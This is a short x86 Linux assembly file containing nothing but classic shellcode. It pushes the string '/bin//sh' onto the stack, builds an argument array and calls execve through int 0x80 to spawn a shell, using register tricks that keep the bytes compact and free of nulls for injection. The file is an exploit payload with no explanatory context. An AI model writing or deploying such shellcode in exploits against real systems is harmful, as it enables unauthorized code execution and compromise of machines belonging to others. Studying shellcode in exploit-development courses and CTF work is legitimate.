global _start
section .text
_start:

xor ecx, ecx
mul ecx		;zeroed eax,edx
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
